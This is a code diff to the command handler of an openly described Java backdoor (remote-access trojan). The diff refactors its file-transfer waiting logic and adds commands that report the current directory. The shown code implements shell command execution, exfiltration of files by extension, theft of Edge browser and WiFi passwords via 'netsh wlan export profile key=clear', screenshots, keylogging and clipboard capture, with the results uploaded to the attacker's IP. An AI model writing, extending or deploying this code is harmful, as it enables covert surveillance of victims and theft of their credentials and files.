@@ -26,23 +26,26 @@ public class HandleCommand {
 	 * Handles command.
 	 * <p>
 	 * Handles command {@code command} and sets {@code send} to an appropriate
-	 * response. Uses {@link Backdoor#out} to send the response followed by a token
-	 * to signal the end of the response.
+	 * response. Uses {@link Backdoor#out} to send the response.
 	 *
 	 * @param command command given to the backdoor
 	 */
-	public static void handle(String command) {
+	public static void handle(String command) throws IOException {
 		StringBuilder send = new StringBuilder();
 		if (command.equals("help"))
-			send = new StringBuilder("[cmd] Run Command Prompt commands\n[ps] Run a PowerShell script\n[ds] Run a DuckyScript\n"
+			send = new StringBuilder("[cmd] Open a command prompt shell\n[ps] Run a PowerShell script\n[ds] Run a DuckyScript\n"
 					+ "[exfiles] Exfiltarte files based on extension\n[expass] Exfiltrate Microsoft Edge and WiFi passwords\n"
 					+ "[filesend] Send a file to victim's computer\n[filerec] Receive a file from victim's computer\n"
 					+ "[keylog] Start a KeyLogger on victim's computer\n[ss] Get a screenshot of vitim's computer\n"
 					+ "[cb] Get text currently copied to victim's clipboard\n[cat] Get contents of a file on victim's computer\n"
 					+ "[zip] Compress a directory to a ZIP file\n[unzip] Decompress a ZIP file\n"
 					+ "[remove] Remove backdoor and all backdoor files from victim's computer\n[exit] Exit");
+		else if (command.equals("current-dir"))
+			send = new StringBuilder(System.getProperty("user.dir"));
+		else if (command.equals("current-cmd-dir"))
+			send = new StringBuilder(Utils.currentCMDDirectory);
 		else if (command.startsWith("cmd"))
-			send = new StringBuilder(Utils.runCommand(command.substring(4)));
+			send = new StringBuilder(Utils.runCommand(command.substring(4), true));
 		else if (command.startsWith("ps") || command.startsWith("ds")) {
 			File file = new File(command.substring(3));
 			try {
@@ -69,15 +72,7 @@ public class HandleCommand {
 						new ArrayList<>(Arrays.asList(command.substring(command.indexOf("*") + 1).split(","))));
 				Utils.zipDir(exfiltratedFiles.getAbsolutePath());
 				FTP.backdoor(exfiltratedFiles.getAbsolutePath() + ".zip", "send", Backdoor.ip);
-				while (!FTP.socketTransferDone && FTP.error == null)
-					Thread.sleep(10);
-				if (FTP.socketTransferDone)
-					FTP.socketTransferDone = false;
-				if (FTP.error != null) {
-					String error = FTP.error;
-					FTP.error = null;
-					throw new Exception(error);
-				}
+				waitForSocketTransfer();
 				send = new StringBuilder("Files exfiltrated");
 			} catch (Exception e) {
 				send = new StringBuilder("An error occurred when trying to exfiltrate files");
@@ -93,7 +88,8 @@ public class HandleCommand {
 		} else if (command.equals("expass")) {
 			File exfiltratedPasswords = new File(Backdoor.gatheredDir + "ExfiltratedPasswords");
 			try {
-				exfiltratedPasswords.mkdir();
+				if (!exfiltratedPasswords.mkdir())
+					throw new Exception("Could not create directory");
 				File exfilBrowserCredsScript = new File(
 						exfiltratedPasswords.getAbsolutePath() + File.separator + "ExfilBrowserCreds.ps1");
 				PrintWriter out = new PrintWriter(exfilBrowserCredsScript);
@@ -105,20 +101,11 @@ public class HandleCommand {
 				out.flush();
 				out.close();
 				Utils.runPSScript(exfilBrowserCredsScript.getAbsolutePath());
-				Utils.runCommand(
-						"netsh wlan export profile key=clear folder=" + exfiltratedPasswords.getAbsolutePath());
+				Utils.runCommand("netsh wlan export profile key=clear folder=" + exfiltratedPasswords.getAbsolutePath(), false);
 				FileUtils.forceDelete(exfilBrowserCredsScript);
 				Utils.zipDir(exfiltratedPasswords.getAbsolutePath());
 				FTP.backdoor(exfiltratedPasswords.getAbsolutePath() + ".zip", "send", Backdoor.ip);
-				while (!FTP.socketTransferDone && FTP.error == null)
-					Thread.sleep(10);
-				if (FTP.socketTransferDone)
-					FTP.socketTransferDone = false;
-				if (FTP.error != null) {
-					String error = FTP.error;
-					FTP.error = null;
-					throw new Exception(error);
-				}
+				waitForSocketTransfer();
 				send = new StringBuilder("Passwords exfiltrated");
 			} catch (Exception e) {
 				send = new StringBuilder("An error occurred when trying to exfiltrate passwords");
@@ -142,15 +129,7 @@ public class HandleCommand {
 		} else if (command.startsWith("filesend")) {
 			try {
 				FTP.backdoor(command.substring(9), "rec", Backdoor.ip);
-				while (!FTP.socketTransferDone && FTP.error == null)
-					Thread.sleep(10);
-				if (FTP.socketTransferDone)
-					FTP.socketTransferDone = false;
-				if (FTP.error != null) {
-					String error = FTP.error;
-					FTP.error = null;
-					throw new Exception(error);
-				}
+				waitForSocketTransfer();
 				send = new StringBuilder("File sent");
 			} catch (Exception e) {
 				send = new StringBuilder("An error occurred when trying to send file");
@@ -167,15 +146,7 @@ public class HandleCommand {
 					FTP.backdoor(file.getAbsolutePath() + ".zip", "send", Backdoor.ip);
 				}
 
-				while (!FTP.socketTransferDone && FTP.error == null)
-					Thread.sleep(10);
-				if (FTP.socketTransferDone)
-					FTP.socketTransferDone = false;
-				if (FTP.error != null) {
-					String error = FTP.error;
-					FTP.error = null;
-					throw new Exception(error);
-				}
+				waitForSocketTransfer();
 				send = new StringBuilder("File received");
 			} catch (Exception e) {
 				send = new StringBuilder("An error occurred when trying to receive file");
@@ -199,15 +170,7 @@ public class HandleCommand {
 						new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())),
 						"png", screenshot);
 				FTP.backdoor(screenshot.getAbsolutePath(), "send", Backdoor.ip);
-				while (!FTP.socketTransferDone && FTP.error == null)
-					Thread.sleep(10);
-				if (FTP.socketTransferDone)
-					FTP.socketTransferDone = false;
-				if (FTP.error != null) {
-					String error = FTP.error;
-					FTP.error = null;
-					throw new Exception(error);
-				}
+				waitForSocketTransfer();
 				send = new StringBuilder("Screenshot received");
 			} catch (Exception e) {
 				send = new StringBuilder("An error occurred when trying to receive screenshot");
@@ -276,6 +239,24 @@ public class HandleCommand {
 			}
 		else if (!command.isEmpty())
 			send = new StringBuilder("Command not found");
-		Backdoor.out.println(send.toString() + "\n!$end$!");
+		Backdoor.out.writeObject(send.toString());
+		Backdoor.out.flush();
+	}
+
+	/**
+	 * Waits for the socket file transfer to result in either a success or error.
+	 *
+	 * @throws Exception
+	 */
+	private static void waitForSocketTransfer() throws Exception {
+		while (!FTP.socketTransferDone && FTP.error == null)
+			Thread.sleep(10);
+		if (FTP.socketTransferDone)
+			FTP.socketTransferDone = false;
+		if (FTP.error != null) {
+			String error = FTP.error;
+			FTP.error = null;
+			throw new Exception(error);
+		}
 	}
 }
